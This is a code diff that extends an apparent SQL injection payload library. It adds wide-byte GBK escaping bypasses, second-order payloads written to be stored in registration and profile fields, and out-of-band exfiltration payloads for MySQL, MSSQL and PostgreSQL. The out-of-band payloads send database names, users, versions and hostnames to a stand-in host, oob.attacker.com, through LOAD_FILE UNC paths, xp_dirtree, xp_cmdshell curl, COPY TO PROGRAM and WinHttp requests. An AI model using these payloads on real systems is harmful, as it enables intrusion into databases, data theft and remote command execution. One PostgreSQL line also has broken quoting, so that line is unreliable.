@@ -369,9 +369,112 @@ def get_time_payloads(db_type: str = "mysql", limit: int = 8) -> List[str]:
     return TIME_BASED_PAYLOADS.get(db_type, TIME_BASED_PAYLOADS["mysql"])[:limit]
 
 
+# ── Wide-Byte Injection (GBK bypass for addslashes/magic_quotes) ──
+
+WIDE_BYTE_PAYLOADS: List[str] = [
+    "%df'",                          # Classic GBK wide-byte: %df' → 運'
+    "%df%5c",                        # %df%5c → 縗 (consumes the backslash)
+    "%bf%27",                        # Big5 variant
+    "%df%27",                        # Direct wide-byte quote
+    "%aa%5c",                        # Consumes backslash via valid 2-byte
+    "%81%5c",                        # Another GBK backslash consumer
+    "%8e%5c",                        # CP936 variant
+    "%99%5c",                        # Shift-JIS-like backslash consumption
+    "' %%df%27 --",                  # Mixed: normal quote then wide-byte
+    "1%df%27 AND 1=1--",            # Wide-byte with boolean context
+    "%df' OR 1=1--",                 # Wide-byte OR injection
+    "%df' UNION SELECT 1,2,3--",     # Wide-byte UNION
+    "%df' AND SLEEP(3)--",           # Wide-byte time-based
+]
+
+# ── Second-Order SQLi Payloads ─────────────────────────────────
+# These payloads are designed to be STORED in the database (via registration,
+# profile update, etc.) and trigger when the stored value is used in a query.
+
+SECOND_ORDER_PAYLOADS: Dict[str, List[str]] = {
+    "create": [
+        # 注册/创建场景 — payload 写入数据库
+        "admin'--",
+        "test' OR '1'='1",
+        "user' UNION SELECT 1,2,3--",
+        "profile' AND 1=1--",
+        "admin'/*",
+        "admin' OR '1'='1' --",
+    ],
+    "update": [
+        # 更新资料场景
+        "John' AND 1=1--",
+        "Doe' OR SLEEP(2)--",
+        "city' UNION SELECT @@version--",
+        "email' OR '1'='1",
+        "bio' AND 1=2--",
+    ],
+    "stored_trigger": [
+        # 触发存储 payload 的注入 payload
+        "' UNION SELECT 1,2,3,4,5--",
+        "'; SELECT pg_sleep(2)--",
+        "' AND 1=1 UNION SELECT 1,2,3--",
+        "' OR '1'='1' UNION SELECT 1,2,3,4--",
+    ],
+    "oob_dns": [
+        # 带 OOB DNS 的第二注入 payload
+        "a' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.attacker.com\\\\test'))--",
+        "' AND 1=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\x'))--",
+    ],
+}
+
+# ── OOB (Out-of-Band) Exfiltration Payloads ────────────────────
+
+OOB_DNS_PAYLOADS: Dict[str, List[str]] = {
+    "mysql": [
+        "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.oob.attacker.com\\\\test'))",
+        "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.oob.attacker.com\\\\x'))",
+        "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.oob.attacker.com\\\\v'))",
+        "SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.oob.attacker.com\\\\t'))",
+    ],
+    "mssql": [
+        "EXEC master..xp_dirtree '\\\\\\\\oob.attacker.com\\\\test'",
+        "EXEC master..xp_fileexist '\\\\\\\\oob.attacker.com\\\\x'",
+        "DECLARE @q varchar(1024); SET @q='\\\\\\\\'+db_name()+'.oob.attacker.com\\\\d'; EXEC master..xp_dirtree @q",
+    ],
+    "postgresql": [
+        "COPY (SELECT current_database()) TO PROGRAM 'nslookup '".'$.oob.attacker.com'",
+        "COPY (SELECT version()) TO PROGRAM 'curl http://oob.attacker.com/$(whoami)'",
+        "PERFORM dblink_exec('host=oob.attacker.com dbname=x', 'SELECT 1')",
+    ],
+}
+
+OOB_HTTP_PAYLOADS: Dict[str, List[str]] = {
+    "mysql": [
+        "SELECT http_get('http://oob.attacker.com/' || database())",
+        "SELECT LOAD_FILE('\\\\\\\\oob.attacker.com\\\\' || database())",
+        "SELECT LOAD_FILE(CONCAT('\\\\\\\\oob.attacker.com\\\\',user()))",
+    ],
+    "mssql": [
+        "EXEC master..xp_cmdshell 'curl http://oob.attacker.com/$env:COMPUTERNAME'",
+        "DECLARE @h INT; EXEC sp_oacreate 'WinHttp.WinHttpRequest.5.1', @h OUT; EXEC sp_oamethod @h, 'open', NULL, 'GET', 'http://oob.attacker.com/sqli', 'false';",
+    ],
+}
+
+
 def get_stacked_payloads(db_type: str = "mysql", limit: int = 5) -> List[str]:
     return STACKED_QUERY_PAYLOADS.get(db_type, STACKED_QUERY_PAYLOADS["mysql"])[:limit]
 
 
 def get_waf_bypass_payloads(limit: int = 20) -> List[str]:
     return WAF_BYPASS_PAYLOADS[:limit]
+
+
+def get_wide_byte_payloads(limit: int = 8) -> List[str]:
+    return WIDE_BYTE_PAYLOADS[:limit]
+
+
+def get_second_order_payloads(category: str = "create", limit: int = 4) -> List[str]:
+    payloads = SECOND_ORDER_PAYLOADS.get(category, SECOND_ORDER_PAYLOADS["create"])
+    return payloads[:limit]
+
+
+def get_oob_payloads(db_type: str = "mysql", limit: int = 3) -> List[str]:
+    dns = OOB_DNS_PAYLOADS.get(db_type, OOB_DNS_PAYLOADS["mysql"])[:limit]
+    http = OOB_HTTP_PAYLOADS.get(db_type, OOB_HTTP_PAYLOADS["mysql"])[:limit]
+    return dns + http
